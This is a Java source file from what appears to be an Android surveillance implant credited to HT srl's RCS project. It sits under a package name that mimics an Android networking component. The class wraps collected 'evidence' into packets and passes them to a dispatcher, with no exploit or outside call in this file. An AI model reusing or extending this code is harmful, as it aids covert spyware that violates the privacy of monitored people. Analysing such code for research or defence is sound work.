/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : LogR.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.evidence;

import java.util.ArrayList;

import com.android.networking.Packet;
import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;
import com.android.networking.util.DataBuffer;
import com.android.networking.util.Utils;
import com.android.networking.util.WChar;

/**
 * The Class LogR.
 */
public class EvidenceReference {
	private static final String TAG = "LogR";

	/** The type. */
	private int type;

	/** The unique. */
	private long unique;

	/** The disp. */
	private EvDispatcher disp;

	private boolean hasData;

	private int size;

	/** The Constant LOG_CREATE. */
	final public static int LOG_CREATE = 0x1;

	/** The Constant LOG_ATOMIC. */
	final public static int LOG_ATOMIC = 0x2;

	/** The Constant LOG_APPEND. */
	final public static int LOG_APPEND = 0x3;

	/** The Constant LOG_WRITE. */
	final public static int LOG_WRITE = 0x4;

	/** The Constant LOG_CLOSE. */
	final public static int LOG_CLOSE = 0x5;

	/** The Constant LOG_ITEMS. */
	final public static int LOG_ITEMS = 0x6;

	public static final int INTERRUPT = -1;

	/** The EVIDENCE delimiter. */
	public static int E_DELIMITER = 0xABADC0DE;

	/**
	 * Instantiates a new log, creates the evidence.
	 * 
	 * @param evidence
	 *            the log type
	 * @param priority
	 *            the priority
	 */
	public EvidenceReference(final int evidence) {
		final Packet p = init(evidence);
		p.setCommand(LOG_CREATE);

		send(p);
	}

	/**
	 * Instantiates a new log, creates the evidence with additional.
	 * 
	 * @param evidenceType
	 *            the log type
	 * @param priority
	 *            the priority
	 * @param additional
	 *            the additional
	 */
	public EvidenceReference(final int evidenceType, final byte[] additional) {
		final Packet p = init(evidenceType);
		p.setCommand(LOG_CREATE);
		p.setAdditional(additional);

		send(p);
	}

	/**
	 * Instantiates a new log, creates atomically the evidence with additional
	 * and data.
	 * 
	 * @param evidenceType
	 *            the log type
	 * @param priority
	 *            the priority
	 * @param additional
	 *            the additional
	 * @param data
	 *            the data
	 */
	private EvidenceReference(final int evidenceType, final byte[] additional, final byte[] data) {
		final Packet p = init(evidenceType);
		p.setCommand(LOG_ATOMIC);
		p.setAdditional(additional);
		p.setData(data);

		hasData = true;
		size = data.length;

		send(p);
	}

	private Packet init(final int evidence) {
		unique = Utils.getRandom();
		disp = EvDispatcher.self();
		type = evidence;

		final Packet p = new Packet(unique);

		p.setType(type);

		return p;
	}

	public static void atomic(int evidenceType, byte[] additional, byte[] data) {
		if (Cfg.DEBUG) {
			//Check.log(TAG + " (atomic)");
		}
		final Packet p = new Packet(evidenceType, additional, data);
		EvDispatcher.self().send(p);
	}

	public static void atomic(int evidenceType, ArrayList<byte[]> items) {
		if (Cfg.DEBUG) {
			//Check.log(TAG + " (atomic)");
		}
		final Packet p = new Packet(evidenceType, items);
		EvDispatcher.self().send(p);
	}

	// Send data to dispatcher
	/**
	 * Send.
	 * 
	 * @param p
	 *            the p
	 */
	private void send(final Packet p) {
		if (disp == null) {
			disp = EvDispatcher.self();

			if (disp == null) {
				return;
			}
		}

		disp.send(p);
	}

	/**
	 * Write or append data to the log.
	 * 
	 * @param data
	 *            the data
	 */
	public void write(final byte[] data) {
		final Packet p = new Packet(unique);

		p.setCommand(LOG_WRITE);
		p.setData(data);
		send(p);

		hasData = true;
		size += data.length;

		return;
	}

	public void write(ArrayList<byte[]> bytelist) {
		int totalLen = 0;
		for (final byte[] token : bytelist) {
			totalLen += token.length;
		}

		final int offset = 0;
		final byte[] buffer = new byte[totalLen];
		final DataBuffer databuffer = new DataBuffer(buffer, 0, totalLen);

		for (final byte[] token : bytelist) {
			databuffer.write(token);
		}

		write(buffer);
	}

	/**
	 * Close.
	 */
	public void close() {
		final Packet p = new Packet(unique);

		p.setCommand(LOG_CLOSE);
		send(p);
		return;
	}

	public void immediateClose() {
		final Packet p = new Packet(unique);

		p.setCommand(LOG_CLOSE);
		send(p);
		// TODO: rendere la send sincrona.
		Utils.sleep(2000);
	}

	public boolean hasData() {
		return hasData;
	}

	/**
	 * Info.
	 * 
	 * @param message
	 *            the message
	 */
	public static void info(final String message) {
		try {
			// atomic info
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + message);//$NON-NLS-1$
			}

			atomic(EvidenceType.INFO, null, WChar.getBytes(message, true));

		} catch (final Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + ex.toString());//$NON-NLS-1$
			}
		}
	}

	public int getSize() {
		return size;
	}
}
